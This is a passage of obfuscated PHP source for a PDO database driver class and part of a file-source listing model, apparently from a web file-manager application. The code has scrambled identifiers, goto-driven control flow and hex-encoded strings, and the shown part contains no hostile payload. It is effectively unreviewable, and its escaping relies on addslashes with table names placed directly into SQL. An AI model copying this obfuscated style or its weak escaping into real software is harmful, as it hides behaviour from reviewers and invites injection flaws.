($B’Ô®È—½ˆ != $F¨µÅƒÎ´ê[182] && !preg_match($F¨µÅƒÎ´ê[871], $B’Ô®È—½ˆ)) { $B’Ô®È—½ˆ = $F¨µÅƒÎ´ê[382] . trim($B’Ô®È—½ˆ, $F¨µÅƒÎ´ê[382]) . $F¨µÅƒÎ´ê[382]; } return $B’Ô®È—½ˆ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F¢¦ÑØÈ˜É = '') { $bÜ«È„Š¶Û =& $_SERVER[œº]; if (!class_exists($bÜ«È„Š¶Û[873])) { think_exception(think_lang($bÜ«È„Š¶Û[10]) . $bÜ«È„Š¶Û[874]); } if (!empty($F¢¦ÑØÈ˜É)) { $this->config = $F¢¦ÑØÈ˜É; if (empty($this->config[$bÜ«È„Š¶Û[13]])) { $this->config[$bÜ«È„Š¶Û[13]] = array(); } } } public function connect($dÜ‡âÆìè° = '', $fœ­÷ƒñ = 0) { $e°’‘…‰•Ÿ =& $_SERVER[œº]; if (!isset($this->linkID[$fœ­÷ƒñ])) { goto bÏö†‡óÊÜ; Aš¼•¼É²Ò: if (!$this->linkID[$fœ­÷ƒñ]) { think_exception($e°’‘…‰•Ÿ[883]); } try { $this->linkID[$fœ­÷ƒñ]->exec($e°’‘…‰•Ÿ[884] . think_config($e°’‘…‰•Ÿ[851])); } catch (Exception $d¶Ìˆ¹) { } $this->connected = !0; goto b‚°Î›ßÚ‚; b‚°Î›ßÚ‚: if (1 != think_config($e°’‘…‰•Ÿ[18])) { unset($this->config); } goto Fƒ™¡ˆ‰ˆ‹; bÏö†‡óÊÜ: if (empty($dÜ‡âÆìè°)) { $dÜ‡âÆìè° = $this->config; } $EÅÂ†˜ƒŠ = !empty($dÜ‡âÆìè°[$e°’‘…‰•Ÿ[13]][$e°’‘…‰•Ÿ[14]]) ? $dÜ‡âÆìè°[$e°’‘…‰•Ÿ[13]][$e°’‘…‰•Ÿ[14]] : $this->pconnect; if ($EÅÂ†˜ƒŠ) { $dÜ‡âÆìè°[$e°’‘…‰•Ÿ[13]][PDO::ATTR_PERSISTENT] = !0; } goto eÔè¼èÛ†¤; eÔè¼èÛ†¤: try { $this->linkID[$fœ­÷ƒñ] = new PDO($dÜ‡âÆìè°[$e°’‘…‰•Ÿ[875]], $dÜ‡âÆìè°[$e°’‘…‰•Ÿ[848]], $dÜ‡âÆìè°[$e°’‘…‰•Ÿ[849]], $dÜ‡âÆìè°[$e°’‘…‰•Ÿ[13]]); } catch (PDOException $d¶Ìˆ¹) { think_exception($d¶Ìˆ¹->getMessage()); } $this->dbType = $this->_getDsnType($dÜ‡âÆìè°[$e°’‘…‰•Ÿ[875]]); if (in_array($this->dbType, array($e°’‘…‰•Ÿ[876], $e°’‘…‰•Ÿ[877], $e°’‘…‰•Ÿ[878], $e°’‘…‰•Ÿ[879]))) { think_exception($e°’‘…‰•Ÿ[880] . $this->dbType . $e°’‘…‰•Ÿ[881] . $this->dbType . $e°’‘…‰•Ÿ[882]); } goto Aš¼•¼É²Ò; Fƒ™¡ˆ‰ˆ‹: } return $this->linkID[$fœ­÷ƒñ]; } public function free() { $this->PDOStatement = null; } public function query($BÓÅÈŠ —Â, $BìÄ’ĞšÉ = array()) { goto dÔ«£¡°ôé; AÉŠÎÑ¥ø: think_action_status($f÷¿¸ŞËÁ³[19], 1); think_status($f÷¿¸ŞËÁ³[20]); $this->PDOStatement = $this->_linkID->prepare($BÓÅÈŠ —Â); goto E½‹¶¸Ì; E½‹¶¸Ì: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b¾ˆÜ¢Á—† = $this->PDOStatement->execute($BìÄ’ĞšÉ); $this->debug(); goto c“ÀˆğšÏ; dñ¶ÖÈÉÜ‘: $this->queryStr = $BÓÅÈŠ —Â; if (!empty($BìÄ’ĞšÉ)) { $this->queryStr .= $f÷¿¸ŞËÁ³[885] . print_r($BìÄ’ĞšÉ, !0) . $f÷¿¸ŞËÁ³[886]; } if (!empty($this->PDOStatement)) { $this->free(); } goto AÉŠÎÑ¥ø; c“ÀˆğšÏ: if (!1 === $b¾ˆÜ¢Á—†) { $this->error(); return !1; } else { return $this->getAll(); } goto dØøâ¨; dÔ«£¡°ôé: $f÷¿¸ŞËÁ³ =& $_SERVER[œº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dñ¶ÖÈÉÜ‘; dØøâ¨: } public function execute($aãÄ‹ÙŸ™, $aÓÉ¼½‡÷è = array()) { goto F¸îêª—ª; FÒ‘±Ï®ä®: $this->queryStr = $aãÄ‹ÙŸ™; if (!empty($aÓÉ¼½‡÷è)) { $this->queryStr .= $aš¬ùÓöî…[885] . print_r($aÓÉ¼½‡÷è, !0) . $aš¬ùÓöî…[886]; } $cš«°”‡ì = !1; goto Dë‡›©Îµè; F¸îêª—ª: $aš¬ùÓöî… =& $_SERVER[œº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÒ‘±Ï®ä®; Dë‡›©Îµè: if ($this->dbType == $aš¬ùÓöî…[879]) { if (preg_match($aš¬ùÓöî…[887], $this->queryStr, $eïƒ‘ù‚¡è)) { $this->table = think_config($aš¬ùÓöî…[888]) . str_ireplace(think_config($aš¬ùÓöî…[889]), $aš¬ùÓöî…[375], $eïƒ‘ù‚¡è[2]); $cš«°”‡ì = (bool) $this->query($aš¬ùÓöî…[890] . strtoupper($this->table) . $aš¬ùÓöî…[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aš¬ùÓöî…[21], 1); goto b»¯±„Œøï; d¶ªç³‰£: $cùÍ…Ê½† = $this->PDOStatement->execute($aÓÉ¼½‡÷è); $this->debug(); if (!1 === $cùÍ…Ê½†) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cš«°”‡ì || preg_match($aš¬ùÓöî…[891], $aãÄ‹ÙŸ™)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A©ºÓå¯°; b»¯±„Œøï: think_status($aš¬ùÓöî…[20]); $this->PDOStatement = $this->_linkID->prepare($aãÄ‹ÙŸ™); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d¶ªç³‰£; A©ºÓå¯°: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cæİ•ĞÉÈ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Cæİ•ĞÉÈ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dŒÉéÆà† = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dŒÉéÆà†) { $this->error(); return !1; } } return !0; } private function getAll() { $D¶®ïã¢Ğ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($D¶®ïã¢Ğ); return $D¶®ïã¢Ğ; } public function getFields($aÁˆãçºÂ‚) { goto d’êçîÒ§º; dºİæöÄØ„: $eˆÔáºœöÕ = $this->query($aº‡¨¹ÁÏá); $CôåŞã¿Ğó = array(); if ($eˆÔáºœöÕ) { foreach ($eˆÔáºœöÕ as $A’„Šè ô => $a¡• œùöí) { $a¡• œùöí = array_change_key_case($a¡• œùöí); $a¡• œùöí[$fÜçËÄÊß[28]] = isset($a¡• œùöí[$fÜçËÄÊß[28]]) ? $a¡• œùöí[$fÜçËÄÊß[28]] : $fÜçËÄÊß[375]; $a¡• œùöí[$fÜçËÄÊß[29]] = isset($a¡• œùöí[$fÜçËÄÊß[29]]) ? $a¡• œùöí[$fÜçËÄÊß[29]] : $fÜçËÄÊß[375]; $E£ª¸œˆàÈ = isset($a¡• œùöí[$fÜçËÄÊß[271]]) ? $a¡• œùöí[$fÜçËÄÊß[271]] : $a¡• œùöí[$fÜçËÄÊß[28]]; $CôåŞã¿Ğó[$E£ª¸œˆàÈ] = array($fÜçËÄÊß[28] => $E£ª¸œˆàÈ, $fÜçËÄÊß[29] => $a¡• œùöí[$fÜçËÄÊß[29]], $fÜçËÄÊß[31] => (bool) (isset($a¡• œùöí[$fÜçËÄÊß[103]]) && $a¡• œùöí[$fÜçËÄÊß[103]] === $fÜçËÄÊß[33] || isset($a¡• œùöí[$fÜçËÄÊß[31]]) && $a¡• œùöí[$fÜçËÄÊß[31]] === $fÜçËÄÊß[33]), $fÜçËÄÊß[34] => isset($a¡• œùöí[$fÜçËÄÊß[34]]) ? $a¡• œùöí[$fÜçËÄÊß[34]] : (isset($a¡• œùöí[$fÜçËÄÊß[53]]) ? $a¡• œùöí[$fÜçËÄÊß[53]] : $fÜçËÄÊß[375]), $fÜçËÄÊß[36] => isset($a¡• œùöí[$fÜçËÄÊß[93]]) ? strtolower($a¡• œùöí[$fÜçËÄÊß[93]]) == $fÜçËÄÊß[38] : (isset($a¡• œùöí[$fÜçËÄÊß[54]]) ? $a¡• œùöí[$fÜçËÄÊß[54]] : !1), $fÜçËÄÊß[39] => isset($a¡• œùöí[$fÜçËÄÊß[908]]) ? strtolower($a¡• œùöí[$fÜçËÄÊß[908]]) == $fÜçËÄÊß[41] : (isset($a¡• œùöí[$fÜçËÄÊß[93]]) ? $a¡• œùöí[$fÜçËÄÊß[93]] : !1)); } } goto a™åù›¨œœ; a™åù›¨œœ: return $CôåŞã¿Ğó; goto aÉÈÈ—•éà; d’êçîÒ§º: $fÜçËÄÊß =& $_SERVER[œº]; $this->initConnect(!0); if (think_config($fÜçËÄÊß[892])) { $aº‡¨¹ÁÏá = str_replace($fÜçËÄÊß[893], $aÁˆãçºÂ‚, think_config($fÜçËÄÊß[892])); } else { switch ($this->dbType) { case $fÜçËÄÊß[876]: case $fÜçËÄÊß[894]: $aº‡¨¹ÁÏá = "\123\x45\114\x45\x43\x54\x20\x20\40\143\x6f\x6c\165\x6d\x6e\x5f\156\x61\155\x65\x20\141\x73\x20\x27\116\x61\x6d\x65\47\x2c\40\x20\40\144\141\x74\x61\137\164\171\160\145\x20\x61\x73\x20\47\x54\171\160\145\x27\54\x20\40\40\x63\x6f\x6c\165\155\156\137\x64\x65\x66\141\x75\154\164\x20\x61\163\40\47\104\145\146\x61\165\154\x74\x27\54\40\40\40\x69\x73\x5f\156\x75\154\154\x61\x62\154\145\40\x61\163\40\47\116\x75\154\x6c\47\12\x9\11\x46\x52\117\x4d\x9\x69\156\146\x6f\x72\155\141\x74\x69\x6f\156\x5f\x73\x63\150\145\155\141\x2e\x74\x61\x62\154\145\163\x20\x41\123\40\164\12\11\11\x4a\117\111\116\x9\x69\156\x66\157\162\155\x61\164\151\x6f\x6e\x5f\163\x63\x68\145\155\x61\56\143\157\154\165\x6d\156\x73\x20\101\123\x20\143\xa\11\x9\117\116\x20\x20\x74\56\164\141\142\x6c\x65\x5f\143\x61\164\141\x6c\157\x67\40\x3d\x20\143\x2e\164\x61\142\154\x65\x5f\143\141\164\x61\x6c\157\147\12\x9\11\101\116\104\40\164\56\x74\141\142\154\x65\137\163\x63\x68\x65\155\141\40\75\40\143\x2e\x74\141\142\x6c\x65\137\x73\x63\150\x65\x6d\x61\12\x9\11\101\116\104\40\164\56\x74\141\x62\154\x65\137\156\141\155\x65\40\75\40\143\x2e\164\141\x62\x6c\x65\137\156\x61\155\145\xa\x9\11\x57\110\x45\x52\105\40\40\40\x74\56\x74\x61\142\x6c\x65\x5f\156\141\x6d\145\x20\75\x20\x27{$aÁˆãçºÂ‚}\47"; break; case $fÜçËÄÊß[895]: $aº‡¨¹ÁÏá = $fÜçËÄÊß[896] . $aÁˆãçºÂ‚ . $fÜçËÄÊß[897]; break; case $fÜçËÄÊß[877]: case $fÜçËÄÊß[879]: $aº‡¨¹ÁÏá = $fÜçËÄÊß[898] . $fÜçËÄÊß[899] . $fÜçËÄÊß[900] . strtoupper($aÁˆãçºÂ‚) . $fÜçËÄÊß[901] . strtoupper($aÁˆãçºÂ‚) . $fÜçËÄÊß[902]; break; case $fÜçËÄÊß[903]: $aº‡¨¹ÁÏá = $fÜçËÄÊß[904] . $aÁˆãçºÂ‚ . $fÜçËÄÊß[905]; break; case $fÜçËÄÊß[878]: break; case $fÜçËÄÊß[906]: default: $aº‡¨¹ÁÏá = $fÜçËÄÊß[907] . ($this->dbType == $fÜçËÄÊß[906] ? "\140{$aÁˆãçºÂ‚}\x60" : $aÁˆãçºÂ‚); } } goto dºİæöÄØ„; aÉÈÈ—•éà: } public function getTables($f¥²Ì†Œ¹­ = '') { $FáÙ¨»ÉË¨ =& $_SERVER[œº]; if (think_config($FáÙ¨»ÉË¨[909])) { $CÊĞ’êáô¯ = str_replace($FáÙ¨»ÉË¨[910], $f¥²Ì†Œ¹­, think_config($FáÙ¨»ÉË¨[909])); } else { switch ($this->dbType) { case $FáÙ¨»ÉË¨[877]: case $FáÙ¨»ÉË¨[879]: $CÊĞ’êáô¯ = $FáÙ¨»ÉË¨[911]; break; case $FáÙ¨»ÉË¨[876]: case $FáÙ¨»ÉË¨[894]: $CÊĞ’êáô¯ = $FáÙ¨»ÉË¨[912]; break; case $FáÙ¨»ÉË¨[903]: $CÊĞ’êáô¯ = $FáÙ¨»ÉË¨[913]; break; case $FáÙ¨»ÉË¨[878]: think_exception(think_lang($FáÙ¨»ÉË¨[914]) . $FáÙ¨»ÉË¨[915]); break; case $FáÙ¨»ÉË¨[895]: $CÊĞ’êáô¯ = $FáÙ¨»ÉË¨[42] . $FáÙ¨»ÉË¨[43] . $FáÙ¨»ÉË¨[44]; break; case $FáÙ¨»ÉË¨[906]: default: if (!empty($f¥²Ì†Œ¹­)) { $CÊĞ’êáô¯ = $FáÙ¨»ÉË¨[859] . $f¥²Ì†Œ¹­ . $FáÙ¨»ÉË¨[860]; } else { $CÊĞ’êáô¯ = $FáÙ¨»ÉË¨[861]; } } } $AÏ³Êœïö = $this->query($CÊĞ’êáô¯); $E”²‹ÑÑÄ = array(); foreach ($AÏ³Êœïö as $e¤ àŠ„²¶ => $E˜îˆ†˜¶á) { $E”²‹ÑÑÄ[$e¤ àŠ„²¶] = current($E˜îˆ†˜¶á); } return $E”²‹ÑÑÄ; } protected function parseLimit($fàÈ´Š¼…è) { $aÅÉÔ¿°÷‘ =& $_SERVER[œº]; $E‹õëÏèÁ = $aÅÉÔ¿°÷‘[33]; if (!empty($fàÈ´Š¼…è)) { switch ($this->dbType) { case $aÅÉÔ¿°÷‘[903]: case $aÅÉÔ¿°÷‘[895]: $fàÈ´Š¼…è = explode($aÅÉÔ¿°÷‘[47], $fàÈ´Š¼…è); if (count($fàÈ´Š¼…è) > 1) { $E‹õëÏèÁ .= $aÅÉÔ¿°÷‘[48] . $fàÈ´Š¼…è[1] . $aÅÉÔ¿°÷‘[49] . $fàÈ´Š¼…è[0] . $aÅÉÔ¿°÷‘[50]; } else { $E‹õëÏèÁ .= $aÅÉÔ¿°÷‘[48] . $fàÈ´Š¼…è[0] . $aÅÉÔ¿°÷‘[50]; } break; case $aÅÉÔ¿°÷‘[876]: case $aÅÉÔ¿°÷‘[894]: break; case $aÅÉÔ¿°÷‘[878]: break; case $aÅÉÔ¿°÷‘[877]: case $aÅÉÔ¿°÷‘[879]: break; case $aÅÉÔ¿°÷‘[906]: default: $E‹õëÏèÁ .= $aÅÉÔ¿°÷‘[48] . $fàÈ´Š¼…è . $aÅÉÔ¿°÷‘[50]; } } return $E‹õëÏèÁ; } public function parseKey(&$BÔ´˜åğ’ø, $fªÍâªÛœ¸ = true) { $EŒ¦•ÍŞ•‹ =& $_SERVER[œº]; if ($fªÍâªÛœ¸) { $BÔ´˜åğ’ø = $this->parseKeyCheck($BÔ´˜åğ’ø); } if ($this->dbType == $EŒ¦•ÍŞ•‹[906]) { if ($BÔ´˜åğ’ø != $EŒ¦•ÍŞ•‹[182] && !preg_match($EŒ¦•ÍŞ•‹[871], $BÔ´˜åğ’ø)) { $BÔ´˜åğ’ø = $EŒ¦•ÍŞ•‹[382] . trim($BÔ´˜åğ’ø, $EŒ¦•ÍŞ•‹[382]) . $EŒ¦•ÍŞ•‹[382]; } return $BÔ´˜åğ’ø; } else { return parent::parseKey($BÔ´˜åğ’ø, $fªÍâªÛœ¸); } } public function close() { $this->_linkID = null; } public function error() { $aãˆ—ó÷¿ˆ =& $_SERVER[œº]; if ($this->PDOStatement) { $b¬İÖ÷ÎÁæ = $this->PDOStatement->errorInfo(); $this->error = $b¬İÖ÷ÎÁæ[1] . $aãˆ—ó÷¿ˆ[4] . $b¬İÖ÷ÎÁæ[2]; } else { $this->error = $aãˆ—ó÷¿ˆ[33]; } if ($aãˆ—ó÷¿ˆ[33] != $this->queryStr) { $this->error .= LNG($aãˆ—ó÷¿ˆ[45]) . $this->queryStr; } think_trace($this->error, $aãˆ—ó÷¿ˆ[33], $aãˆ—ó÷¿ˆ[46]); return $this->error; } public function escapeString($cÀ±ÁÑ‰´Œ) { $Cã´¡åÔÔÆ =& $_SERVER[œº]; switch ($this->dbType) { case $Cã´¡åÔÔÆ[903]: case $Cã´¡åÔÔÆ[876]: case $Cã´¡åÔÔÆ[894]: case $Cã´¡åÔÔÆ[906]: return addslashes($cÀ±ÁÑ‰´Œ); case $Cã´¡åÔÔÆ[878]: case $Cã´¡åÔÔÆ[895]: case $Cã´¡åÔÔÆ[877]: case $Cã´¡åÔÔÆ[879]: return str_ireplace($Cã´¡åÔÔÆ[55], $Cã´¡åÔÔÆ[56], $cÀ±ÁÑ‰´Œ); } } protected function parseValue($BÕ­Ú»ºš—) { $FÅ ïËØé— =& $_SERVER[œº]; if (is_string($BÕ­Ú»ºš—)) { $b†­ˆÒÃ¤ = strpos($BÕ­Ú»ºš—, $FÅ ïËØé—[4]) === 0 && in_array($BÕ­Ú»ºš—, array_keys($this->bind)); $BÕ­Ú»ºš— = $b†­ˆÒÃ¤ ? $this->escapeString($BÕ­Ú»ºš—) : $FÅ ïËØé—[916] . $this->escapeString($BÕ­Ú»ºš—) . $FÅ ïËØé—[916]; } elseif (isset($BÕ­Ú»ºš—[0]) && is_string($BÕ­Ú»ºš—[0]) && strtolower($BÕ­Ú»ºš—[0]) == $FÅ ïËØé—[295]) { $BÕ­Ú»ºš— = $this->escapeString($BÕ­Ú»ºš—[1]); } elseif (is_array($BÕ­Ú»ºš—)) { $BÕ­Ú»ºš— = array_map(array($this, $FÅ ïËØé—[917]), $BÕ­Ú»ºš—); } elseif (is_bool($BÕ­Ú»ºš—)) { $BÕ­Ú»ºš— = $BÕ­Ú»ºš— ? $FÅ ïËØé—[87] : $FÅ ïËØé—[191]; } elseif (is_null($BÕ­Ú»ºš—)) { $BÕ­Ú»ºš— = $FÅ ïËØé—[103]; } return $BÕ­Ú»ºš—; } public function getLastInsertId() { $Fò¿İº„¡ =& $_SERVER[œº]; switch ($this->dbType) { case $Fò¿İº„¡[903]: case $Fò¿İº„¡[895]: case $Fò¿İº„¡[876]: case $Fò¿İº„¡[894]: case $Fò¿İº„¡[878]: case $Fò¿İº„¡[906]: return $this->_linkID->lastInsertId(); case $Fò¿İº„¡[877]: case $Fò¿İº„¡[879]: $d³»µğË¤Ñ = $this->table; $D·ÅÇ¥›á¶ = $this->query("\x53\x45\114\105\x43\124\40{$d³»µğË¤Ñ}\56\143\x75\x72\x72\x76\x61\154\x20\x63\165\x72\x72\x76\x61\x6c\x20\106\122\x4f\115\40\144\165\x61\x6c"); return $D·ÅÇ¥›á¶ ? $D·ÅÇ¥›á¶[0][$Fò¿İº„¡[918]] : 0; } } } goto EØ³çÄ“æÚ; A²Óä«òÌİ: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\x63\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\155\x65" => "\151\157\137\x73\x6f\165\x72\x63\145\137\x6d\x65\164\x61", "\155\145\x74\x61\x46\151\145\154\x64" => "\x73\157\x75\162\143\145\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\x6d\145", "\164\x69\155\x65", "\x69\x6e\163\x65\162\164", "\146\165\x6e\x63\164\x69\157\x6e"), array("\x63\162\145\x61\x74\x65\124\151\x6d\x65", "\164\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\x76\x69\145\x77\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\x74", "\x66\165\156\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($e¢ÉÍÁœ¼) { return $this->listSource(array($_SERVER[œº][394] => $e¢ÉÍÁœ¼)); } public function typeName($Eö ‚ºŠ…ö) { static $DÒÜÕ’ˆ  = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\x72\157\x75\160"); return $DÒÜÕ’ˆ [$Eö ‚ºŠ…ö . $_SERVER[œº][33]]; } public function sourceListInfo($EÍÍ²”æÏ², $EÉŠİëËšÕ = false) { goto A’¼ÑÒ×ƒ»; A’¼ÑÒ×ƒ»: $D·µŠ¤°¯ =& $_SERVER[œº]; $EÍÍ²”æÏ² = $EÍÍ²”æÏ² ? $EÍÍ²”æÏ² : array(); $EÍÍ²”æÏ² = array_filter(array_unique($EÍÍ²”æÏ²)); goto BŠï±¿Ë¾†; BŠï±¿Ë¾†: if (!$EÍÍ²”æÏ²) { return array(); } $d µùÕ§ôÇ = $this->where(array($D·µŠ¤°¯[395] => array($D·µŠ¤°¯[7], $EÍÍ²”æÏ²)))->select(); $this->_listDataApply($d µùÕ§ôÇ, $EÉŠİëËšÕ); goto bƒŠî¬—Ÿ; bƒŠî¬—Ÿ: return array_to_keyvalue($d µùÕ§ôÇ, $D·µŠ¤°¯[395]); goto a«”ãŸÊİ…; a«”ãŸÊİ…: } public function pathInfoFilter(&$fâƒ„°‡ö) { goto bÓÅÂ¥ñÚê; bÓÅÂ¥ñÚê: $eˆ«˜‘â†– =& $_SERVER[œº]; static $a”æ¥ªŠï = false; static $aİçùªæä» = false; goto E‹—‰Ğ¶Š˜; d¥õîÛâæ: $fâƒ„°‡ö[$eˆ«˜‘â†–[76]] = $eˆ«˜‘â†–[401] . $fâƒ„°‡ö[$eˆ«˜‘â†–[395]] . $eˆ«˜‘â†–[402]; $fâƒ„°‡ö[$eˆ«˜‘â†–[29]] = $fâƒ„°‡ö[$eˆ«˜‘â†–[403]] == 1 ? $eˆ«˜‘â†–[77] : $eˆ«˜‘â†–[193]; $fâƒ„°‡ö[$eˆ«˜‘â†–[404]] = $this->typeName($fâƒ„°‡ö[$eˆ«˜‘â†–[404]]); goto c¨Õ¿«ß²¯; c¨Õ¿«ß²¯: if ($fâƒ„°‡ö[$eˆ«˜‘â†–[403]] != 1) { $fâƒ„°‡ö[$eˆ«˜‘â†–[168]] = $fâƒ„°‡ö[$eˆ«˜‘â†–[405]]; unset($fâƒ„°‡ö[$eˆ«˜‘â†–[405]]); } $fáÇ¡¾©ïŒ = $a”æ¥ªŠï; if (isset($fâƒ„°‡ö[$eˆ«˜‘â†–[406]]) && $fâƒ„°‡ö[$eˆ«˜‘â†–[406]][$eˆ«˜‘â†–[407]] == -1) { $fáÇ¡¾©ïŒ = $aİçùªæä»; } goto cíâïÒª­É; E‹—‰Ğ¶Š˜: static $C…ç†„¹Ä = false; if (!$a”æ¥ªŠï) { goto EÛŒ’¬á—Ü; CèŠíŠ£‚‡: $c×…ƒˆ‹…‡ = $eˆ«˜‘â†–[399]; $F¤¼ŒÔ“†Œ = explode($eˆ«˜‘â†–[47], $c×…ƒˆ‹…‡); $a”æ¥ªŠï = explode($eˆ«˜‘â†–[47], $CµµñË³À¸); goto dÊï“Û¸¶; EÛŒ’¬á—Ü: $CµµñË³À¸ = $eˆ«˜‘â†–[396]; $CµµñË³À¸ .= $eˆ«˜‘â†–[397]; $CµµñË³À¸ .= $eˆ«˜‘â†–[398]; goto CèŠíŠ£‚‡; dÊï“Û¸¶: $aİçùªæä» = array(); foreach ($a”æ¥ªŠï as $Eçù¦¸ÈóÓ) { if (in_array($Eçù¦¸ÈóÓ, $F¤¼ŒÔ“†Œ)) { continue; } $aİçùªæä»[] = $Eçù¦¸ÈóÓ; } $C…ç†„¹Ä = explode($eˆ«˜‘â†–[47], $eˆ«˜‘â†–[400]); goto BÀ³À—ãÑ”; BÀ³À—ãÑ”: } foreach ($C…ç†„¹Ä as $E¨Æ‹‹İáÜ) { if (isset($fâƒ„°‡ö[$E¨Æ‹‹İáÜ])) { $fâƒ„°‡ö[$E¨Æ‹‹İáÜ] = intval($fâƒ„°‡ö[$E¨Æ‹‹İáÜ]); } } goto d¥õîÛâæ; cíâïÒª­É: $fâƒ„°‡ö = array_field_key($fâƒ„°‡ö, $fáÇ¡¾©ïŒ); return $fâƒ„°‡ö; goto DÜ£æÄ˜Ç; DÜ£æÄ˜Ç: } public function listUserFav() { goto b¥ßµÖ¯³; F×ÕÛ£íí: foreach ($cÔœñ‰­¥Ü as &$dŒ¹ÑŞÂ°ğ) { $dŒ¹ÑŞÂ°ğ = array($c¡Ä‘Ç‹Ò[412] => $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[393]], $c¡Ä‘Ç‹Ò[413] => $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[28]], $c¡Ä‘Ç‹Ò[414] => $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[76]], $c¡Ä‘Ç‹Ò[415] => $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[29]], $c¡Ä‘Ç‹Ò[416] => $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[194]], $c¡Ä‘Ç‹Ò[417] => $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[84]]); if ($dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[29]] == $c¡Ä‘Ç‹Ò[409] && $F½Ì±ÒÖàğ[$dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[76]]]) { $dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[85]] = $F½Ì±ÒÖàğ[$dŒ¹ÑŞÂ°ğ[$c¡Ä‘Ç‹Ò[76]]]; } } unset($dŒ¹ÑŞÂ°ğ); return $cÔœñ‰­¥Ü; goto fÀš±Ë‰; c‡—»ˆÏé: $d®Ş¶¹£Ï = array_to_keyvalue($d®Ş¶¹£Ï, $c¡Ä‘Ç‹Ò[33], $c¡Ä‘Ç‹Ò[76]); if ($d®Ş¶¹£Ï) { $F½Ì±ÒÖàğ = $this->listSource(array($c¡Ä‘Ç‹Ò[410] => array($c¡Ä‘Ç‹Ò[411], $d®Ş¶¹£Ï))); } $F½Ì±ÒÖàğ = array_to_keyvalue($F½Ì±ÒÖàğ[$c¡Ä‘Ç‹Ò[367]], $c¡Ä‘Ç‹Ò[395]); goto F×ÕÛ£íí; b¥ßµÖ¯³: $c¡Ä‘Ç‹Ò =& $_SERVER[œº]; $cÔœñ‰­¥Ü = Model($c¡Ä‘Ç‹Ò[408])->listData(); $d®Ş¶¹£Ï = array_filter_by_field($cÔœñ‰­¥Ü, $c¡Ä‘Ç‹Ò[29], $c¡Ä‘Ç‹Ò[409]); goto c‡—»ˆÏé; fÀš±Ë‰: } public function listUserTag($E°ÒÚ‚‡‰) { goto f­°ŠÎ‰´â; c¾¿ëĞÄİÀ: $fˆñá¥šÒ‚ = array(); foreach ($bÖ‰‹³ß½ as $e‹ãŞÂŸ¤ß) { $a‡™Š¿•µâ = $e‹ãŞÂŸ¤ß[$e‘µ’¤™Ó [76]]; if (!$a‡™Š¿•µâ) { continue; } if (!isset($fˆñá¥šÒ‚[$a‡™Š¿•µâ])) { $fˆñá¥šÒ‚[$a‡™Š¿•µâ] = array(); } $fˆñá¥šÒ‚[$a‡™Š¿•µâ][] = $e‹ãŞÂŸ¤ß[$e‘µ’¤™Ó [419]]; } $c‰˜³¡¼° = array(); goto fÖÙÅ¦§…Â; e…£‹‘šŸ‚: $Fê™îÑ‰×î = array_to_keyvalue($a…­ˆ³¸¬[$e‘µ’¤™Ó [74]], $e‘µ’¤™Ó [33], $e‘µ’¤™Ó [395]); $D³‚ÒÊ…£ = array_merge($Fê™îÑ‰×î, $F‚ööÜ†äÉ); foreach ($c‰˜³¡¼° as $a‡™Š¿•µâ) { if (!in_array($a‡™Š¿•µâ, $D³‚ÒÊ…£)) { $e“•Ô àó½[] = $a‡™Š¿•µâ; } } goto F˜‘‘×ºÔ«; FˆÛÙ©½ôº: if (!$a…­ˆ³¸¬ || count($c‰˜³¡¼°) == $a…­ˆ³¸¬[$e‘µ’¤™Ó [364]][$e‘µ’¤™Ó [365]]) { return $a…­ˆ³¸¬; } $e“•Ô àó½ = array(); $F‚ööÜ†äÉ = array_to_keyvalue($a…­ˆ³¸¬[$e‘µ’¤™Ó [75]], $e‘µ’¤™Ó [33], $e‘µ’¤™Ó [395]); goto e…£‹‘šŸ‚; F˜‘‘×ºÔ«: if ($e“•Ô àó½) { Model($e‘µ’¤™Ó [420])->removeBySource($e“•Ô àó½); } return $a…­ˆ³¸¬; goto B§ãĞ³ò¾ù; f­°ŠÎ‰´â: $e‘µ’¤™Ó  =& $_SERVER[œº]; if ($E°ÒÚ‚‡‰ && !is_array($E°ÒÚ‚‡‰)) { $E°ÒÚ‚‡‰ = array($E°ÒÚ‚‡‰); } $bÖ‰‹³ß½ = Model($e‘µ’¤™Ó [418])->listData(); goto c¾¿ëĞÄİÀ; fÖÙÅ¦§…Â: foreach ($fˆñá¥šÒ‚ as 